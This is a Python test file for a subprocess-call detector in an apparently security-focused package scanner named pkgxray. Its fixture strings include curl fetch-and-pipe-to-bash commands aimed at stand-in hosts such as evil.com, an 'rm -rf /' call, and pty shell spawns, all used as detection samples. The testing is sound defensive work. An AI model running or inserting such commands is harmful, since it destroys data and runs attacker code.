"""Tests for SubprocessAnalyzer."""

from pkgxray.analyzers.subprocess_calls import SubprocessAnalyzer
from pkgxray.analyzers.base import Severity


def test_import_subprocess_not_flagged():
    """Importar subprocess es legítimo; no debe generar findings."""
    analyzer = SubprocessAnalyzer()
    findings = analyzer.analyze('import subprocess', 'test.py')
    assert len(findings) == 0


def test_detects_subprocess_run_in_function():
    """subprocess.run() dentro de una función → HIGH."""
    analyzer = SubprocessAnalyzer()
    code = 'def build():\n    subprocess.run(["make"])'
    findings = analyzer.analyze(code, 'test.py')
    high = [f for f in findings if f.severity == Severity.HIGH and "run" in f.description]
    assert len(high) >= 1


def test_detects_subprocess_run_at_module_level():
    """subprocess.run() al nivel del módulo → CRITICAL (se ejecuta al importar)."""
    analyzer = SubprocessAnalyzer()
    code = 'subprocess.run(["curl", "http://evil.example.com", "-o", "/tmp/x"])'
    findings = analyzer.analyze(code, 'test.py')
    critical = [f for f in findings if f.severity == Severity.CRITICAL and "run" in f.description]
    assert len(critical) >= 1
    assert "nivel del módulo" in critical[0].description


def test_detects_subprocess_popen():
    """subprocess.Popen() siempre es CRITICAL."""
    analyzer = SubprocessAnalyzer()
    code = 'def shell():\n    subprocess.Popen(["bash", "-c", cmd])'
    findings = analyzer.analyze(code, 'test.py')
    critical = [f for f in findings if f.severity == Severity.CRITICAL]
    assert len(critical) >= 1


def test_detects_os_system():
    """os.system() siempre es CRITICAL."""
    analyzer = SubprocessAnalyzer()
    code = 'import os\nos.system("rm -rf /")'
    findings = analyzer.analyze(code, 'test.py')
    critical = [f for f in findings if f.severity == Severity.CRITICAL and "system" in f.description]
    assert len(critical) >= 1


def test_safe_code_no_subprocess():
    analyzer = SubprocessAnalyzer()
    findings = analyzer.analyze('x = 1 + 2\nprint(x)', 'test.py')
    assert len(findings) == 0


def test_syntax_error_no_crash():
    analyzer = SubprocessAnalyzer()
    findings = analyzer.analyze('def broken(:\n  pass', 'test.py')
    assert isinstance(findings, list)


def test_analyzer_name():
    analyzer = SubprocessAnalyzer()
    code = 'def run_cmd():\n    subprocess.run(["ls"])'
    findings = analyzer.analyze(code, 'test.py')
    assert all(f.analyzer_name == "subprocess" for f in findings)


def test_class_body_treated_as_module_level():
    """subprocess.run() en cuerpo de clase → CRITICAL (corre al importar)."""
    analyzer = SubprocessAnalyzer()
    code = 'class Backdoor:\n    subprocess.run(["curl", "http://evil.com/steal.sh", "|", "bash"])'
    findings = analyzer.analyze(code, 'test.py')
    critical = [f for f in findings if f.severity == Severity.CRITICAL and "run" in f.description]
    assert len(critical) >= 1


def test_aliased_module_detected():
    """import subprocess as sp; sp.run([...]) must be detected."""
    analyzer = SubprocessAnalyzer()
    code = "import subprocess as sp\nsp.run(['curl', 'http://evil.com'])\n"
    findings = analyzer.analyze(code, "test.py")
    assert len(findings) >= 1, "Aliased subprocess.run must be detected"


def test_aliased_os_detected():
    """import os as operating_system; operating_system.system('id') must be detected."""
    analyzer = SubprocessAnalyzer()
    code = "import os as operating_system\noperating_system.system('id')\n"
    findings = analyzer.analyze(code, "test.py")
    assert len(findings) >= 1, "Aliased os.system must be detected"


def test_from_import_alias_detected():
    """from subprocess import run as subrun; subrun(['id']) must be detected."""
    analyzer = SubprocessAnalyzer()
    code = "from subprocess import run as subrun\nsubrun(['id'])\n"
    findings = analyzer.analyze(code, "test.py")
    assert len(findings) >= 1, "from-import alias must be detected"


# ── #1: os.spawn* family ─────────────────────────────────────────────────────

def test_detects_os_spawnl():
    """os.spawnl() must be detected — equivalent to os.system."""
    analyzer = SubprocessAnalyzer()
    code = "import os\ndef run():\n    os.spawnl(os.P_WAIT, '/bin/sh', 'sh', '-c', 'id')"
    findings = analyzer.analyze(code, "test.py")
    assert len(findings) >= 1
    assert any("spawn" in f.description for f in findings)


def test_detects_os_spawnv_at_module_level():
    """os.spawnv() al nivel del módulo → CRITICAL."""
    analyzer = SubprocessAnalyzer()
    code = "import os\nos.spawnv(os.P_WAIT, '/bin/sh', ['sh', '-c', 'curl http://evil.com | sh'])"
    findings = analyzer.analyze(code, "test.py")
    critical = [f for f in findings if f.severity == Severity.CRITICAL]
    assert len(critical) >= 1


# ── #2: subprocess.getoutput / getstatusoutput ────────────────────────────────

def test_detects_subprocess_getoutput():
    """subprocess.getoutput() must be detected — executes shell commands."""
    analyzer = SubprocessAnalyzer()
    code = "import subprocess\ndef run():\n    result = subprocess.getoutput('id')"
    findings = analyzer.analyze(code, "test.py")
    assert len(findings) >= 1
    assert any(f.severity == Severity.HIGH for f in findings)


def test_detects_subprocess_getstatusoutput():
    """subprocess.getstatusoutput() must be detected."""
    analyzer = SubprocessAnalyzer()
    code = "import subprocess\ndef run():\n    code, out = subprocess.getstatusoutput('whoami')"
    findings = analyzer.analyze(code, "test.py")
    assert len(findings) >= 1


# ── #3: pty.spawn ─────────────────────────────────────────────────────────────

def test_detects_pty_spawn():
    """pty.spawn('/bin/bash') must be detected — opens an interactive shell."""
    analyzer = SubprocessAnalyzer()
    code = "import pty\ndef shell():\n    pty.spawn('/bin/bash')"
    findings = analyzer.analyze(code, "test.py")
    assert len(findings) >= 1
    assert any("pty" in f.description for f in findings)


def test_detects_pty_spawn_aliased():
    """import pty as p; p.spawn('/bin/bash') must be detected."""
    analyzer = SubprocessAnalyzer()
    code = "import pty as p\np.spawn('/bin/sh')"
    findings = analyzer.analyze(code, "test.py")
    assert len(findings) >= 1
